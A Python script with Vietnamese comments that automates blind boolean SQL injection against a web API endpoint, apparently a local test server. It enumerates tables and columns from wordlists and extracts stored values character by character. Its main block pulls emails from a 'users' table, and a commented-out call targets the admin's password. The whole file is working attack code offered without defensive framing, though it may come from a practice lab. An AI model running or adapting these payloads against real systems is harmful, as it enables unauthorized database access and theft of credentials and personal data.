import string
import requests
import time
from urllib.parse import quote

TARGET_URL = "http://localhost:8080/api/users/check-id/"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}
DELAY = 0.5

def check_table_existence(table_name):
    """Kiểm tra xem bảng có tồn tại trong database không"""
    # Tạo payload SQL Injection
    payload = f"1 OR (SELECT 'a' FROM {table_name} LIMIT 1)='a' --"
    url = TARGET_URL + quote(payload)
    
    try:
        response = requests.get(url, headers=HEADERS)
        time.sleep(DELAY)
        
        # Giả sử response trả về JSON với trường 'exists' là true/false
        if response.status_code == 200:
            data = response.json()
            return data
        return False
    except Exception as e:
        print(f"Lỗi khi kiểm tra bảng {table_name}: {e}")
        return False

def check_tables_from_file(file_path):
    """Đọc danh sách bảng từ file và kiểm tra từng bảng"""
    try:
        with open(file_path, 'r') as file:
            tables = [line.strip() for line in file if line.strip()]
            
        print(f"[*] Bắt đầu kiểm tra {len(tables)} bảng...")
        
        existing_tables = []
        for table in tables:
            if check_table_existence(table):
                print(f"[+] Bảng tồn tại: {table}")
                existing_tables.append(table)
        
        print("\n[+] Kết quả:")
        print(f"Tổng số bảng kiểm tra: {len(tables)}")
        print(f"Số bảng tồn tại: {len(existing_tables)}")
        if existing_tables:
            print("Các bảng tồn tại:")
            for table in existing_tables:
                print(f"- {table}")
        
        return existing_tables
    except FileNotFoundError:
        print(f"[-] Không tìm thấy file: {file_path}")
        return []
    except Exception as e:
        print(f"[-] Lỗi khi đọc file: {e}")
        return []
    
def check_column_existence(table_name, column_name):
    """Kiểm tra xem cột có tồn tại trong bảng không"""
    # Sử dụng INFORMATION_SCHEMA để kiểm tra cột
    payload = f"1 OR EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table_name}' AND COLUMN_NAME='{column_name}') --"
    url = TARGET_URL + quote(payload)
    
    try:
        response = requests.get(url, headers=HEADERS)
        time.sleep(DELAY)
        
        if response.status_code == 200:
            data = response.json()
            return data
        return False
    except Exception as e:
        print(f"Lỗi khi kiểm tra cột {column_name} trong bảng {table_name}: {e}")
        return False
    
def check_columns_from_file(table_name, file_path):
    """Đọc danh sách cột từ file và kiểm tra từng cột trong bảng chỉ định"""
    try:
        with open(file_path, 'r') as file:
            columns = [line.strip() for line in file if line.strip()]
            
        print(f"\n[*] Bắt đầu kiểm tra {len(columns)} cột trong bảng {table_name}...")
        
        existing_columns = []
        for column in columns:
            if check_column_existence(table_name, column):
                print(f"[+] Cột tồn tại: {column}")
                existing_columns.append(column)
            else:
                print(f"[-] Cột không tồn tại: {column}")
        
        print(f"\n[+] Kết quả kiểm tra cột trong bảng {table_name}:")
        print(f"Tổng số cột kiểm tra: {len(columns)}")
        print(f"Số cột tồn tại: {len(existing_columns)}")
        if existing_columns:
            print("Danh sách cột tồn tại:")
            for column in existing_columns:
                print(f"- {column}")
        
        return existing_columns
    except FileNotFoundError:
        print(f"[-] Không tìm thấy file: {file_path}")
        return []
    except Exception as e:
        print(f"[-] Lỗi khi đọc file: {e}")
        return []

def extract_column_values(table_name, column_name, max_length=50, max_rows=10):
    """
    Dò giá trị của một cột trong bảng sử dụng Blind SQL Injection
    
    Args:
        table_name (str): Tên bảng cần kiểm tra
        column_name (str): Tên cột cần trích xuất giá trị
        max_length (int): Độ dài tối đa của giá trị cần kiểm tra
        max_rows (int): Số lượng hàng tối đa cần kiểm tra
    
    Returns:
        list: Danh sách các giá trị tìm thấy
    """
    print(f"\n[*] Bắt đầu trích xuất giá trị cột {column_name} từ bảng {table_name}...")
    
    values = []
    printable_chars = string.printable.strip()  # Các ký tự có thể in được
    
    # Đầu tiên xác định số lượng hàng trong bảng
    row_count = 0
    while True:
        payload = f"1 OR (SELECT COUNT(*) FROM {table_name})={row_count} --"
        url = TARGET_URL + quote(payload)
        
        try:
            response = requests.get(url, headers=HEADERS)
            time.sleep(DELAY)
            
            if response.status_code == 200 and response.json():
                break
            row_count += 1
            
            if row_count > max_rows:
                print(f"[!] Đạt giới hạn {max_rows} hàng, dừng kiểm tra")
                break
        except Exception as e:
            print(f"Lỗi khi kiểm tra số hàng: {e}")
            break
    
    print(f"[+] Tìm thấy {row_count} hàng trong bảng {table_name}")
    
    # Trích xuất giá trị từng hàng
    for row in range(row_count):
        print(f"\n[*] Đang trích xuất hàng {row + 1}/{row_count}")
        current_value = ""
        
        # Xác định độ dài giá trị
        length = 0
        while length <= max_length:
            payload = f"1 OR (SELECT LENGTH({column_name}) FROM {table_name} LIMIT {row},1)={length} --"
            url = TARGET_URL + quote(payload)
            
            try:
                response = requests.get(url, headers=HEADERS)
                time.sleep(DELAY)
                
                if response.status_code == 200 and response.json():
                    break
                length += 1
            except Exception as e:
                print(f"Lỗi khi kiểm tra độ dài: {e}")
                break
        
        print(f"[*] Độ dài giá trị: {length} ký tự")
        
        # Trích xuất từng ký tự
        for pos in range(1, length + 1):
            for char in printable_chars:
                payload = f"1 OR (SELECT SUBSTRING({column_name},{pos},1) FROM {table_name} LIMIT {row},1)='{char}' --"
                url = TARGET_URL + quote(payload)
                
                try:
                    response = requests.get(url, headers=HEADERS)
                    time.sleep(DELAY)
                    
                    if response.status_code == 200 and response.json():
                        current_value += char
                        print(f"\r[*] Giá trị hiện tại: {current_value}", end="")
                        break
                except Exception as e:
                    print(f"\nLỗi khi kiểm tra ký tự: {e}")
                    break
        
        values.append(current_value)
        print(f"\n[+] Giá trị hàng {row + 1}: {current_value}")
    
    print("\n[+] Kết quả trích xuất:")
    for i, value in enumerate(values, 1):
        print(f"Hàng {i}: {value}")
    
    return values

def extract_related_column_value(table_name, known_column, known_value, target_column, max_length=50):
    """
    Trích xuất giá trị của target_column trong cùng hàng với known_value của known_column
    
    Args:
        table_name (str): Tên bảng cần kiểm tra
        known_column (str): Tên cột đã biết giá trị
        known_value (str): Giá trị đã biết để xác định hàng
        target_column (str): Tên cột cần trích xuất giá trị
        max_length (int): Độ dài tối đa của giá trị cần kiểm tra
    
    Returns:
        str: Giá trị của target_column trong cùng hàng
    """
    print(f"\n[*] Bắt đầu trích xuất giá trị cột {target_column} từ bảng {table_name}")
    print(f"[*] Với điều kiện {known_column} = '{known_value}'")
    
    printable_chars = string.printable.strip()
    target_value = ""
    
    # Kiểm tra xem hàng có tồn tại không
    payload = f"1 OR EXISTS(SELECT 1 FROM {table_name} WHERE {known_column}='{known_value}') --"
    url = TARGET_URL + quote(payload)
    
    try:
        response = requests.get(url, headers=HEADERS)
        time.sleep(DELAY)
        
        if not (response.status_code == 200 and response.json()):
            print(f"[-] Không tìm thấy hàng với {known_column}='{known_value}'")
            return None
    except Exception as e:
        print(f"Lỗi khi kiểm tra hàng tồn tại: {e}")
        return None
    
    # Xác định độ dài giá trị target
    length = 0
    while length <= max_length:
        payload = f"1 OR (SELECT LENGTH({target_column}) FROM {table_name} WHERE {known_column}='{known_value}' LIMIT 1)={length} --"
        url = TARGET_URL + quote(payload)
        
        try:
            response = requests.get(url, headers=HEADERS)
            time.sleep(DELAY)
            
            if response.status_code == 200 and response.json():
                break
            length += 1
        except Exception as e:
            print(f"Lỗi khi kiểm tra độ dài: {e}")
            break
    
    print(f"[*] Độ dài giá trị {target_column}: {length} ký tự")
    
    # Trích xuất từng ký tự
    for pos in range(1, length + 1):
        for char in printable_chars:
            payload = f"1 OR (SELECT SUBSTRING({target_column},{pos},1) FROM {table_name} WHERE {known_column}='{known_value}' LIMIT 1)='{char}' --"
            url = TARGET_URL + quote(payload)
            
            try:
                response = requests.get(url, headers=HEADERS)
                time.sleep(DELAY)
                
                if response.status_code == 200 and response.json():
                    target_value += char
                    print(f"\r[*] Giá trị hiện tại: {target_value}", end="")
                    break
            except Exception as e:
                print(f"\nLỗi khi kiểm tra ký tự: {e}")
                break
    
    print(f"\n[+] Giá trị của {target_column} khi {known_column}='{known_value}': {target_value}")
    return target_value

if __name__ == "__main__":
    # Đường dẫn file chứa danh sách bảng
    TABLE_FILE = "tables.txt"
    # Đường dẫn file chứa danh sách cột
    COLUMN_FILE = "columns.txt"    
    # Chạy kiểm tra
    # found_tables = check_tables_from_file(TABLE_FILE)
    CHECK_TABLE="users"

    # check_columns_from_file(CHECK_TABLE, COLUMN_FILE)

    #check lần lượt nhiều hàng của 1 cột
    COLUMN_EXTRACT = "email"
    extract_column_values(CHECK_TABLE, COLUMN_EXTRACT)

    #check giá trị của 1 hàng khi đã biết trước 1 giá trị
    KNOWN_COLUMN = "name"
    KNOWN_VALUE = "admin"
    TARGET_COLUMN = "password"
    # extract_related_column_value(CHECK_TABLE, KNOWN_COLUMN, KNOWN_VALUE, TARGET_COLUMN)